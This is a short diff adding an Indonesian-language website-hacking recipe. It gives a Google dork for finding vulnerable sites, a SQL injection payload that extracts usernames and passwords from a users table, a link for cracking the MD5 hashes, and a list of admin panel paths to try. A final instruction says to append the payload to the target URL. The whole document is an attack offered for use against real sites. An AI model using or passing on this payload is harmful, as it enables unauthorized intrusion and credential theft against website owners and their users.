@@ -1,0 +1,19 @@
+Meretas website:D
+
+Dork: inurl:/statis-1-profil.html
+         : inurl:/statis-1-profil.html
+         : inurl:/statis-1-profil.html
+
+Exploit:
+'union+select+make_set(6,@:=0x0a,(select(1)from(users)where@:=make_set(511,@,0x3C6C693E,username,password)),@)--+
+
+Crack the MD5:
+https://hashkiller.co.uk/
+
+www.target.com/admin
+www.target.com/adminweb
+www.target.com/administrator
+www.target.com/redaktur
+
+
+Masukin Exploit nya di belakang angka web target setelah itu tekan ctrl+u
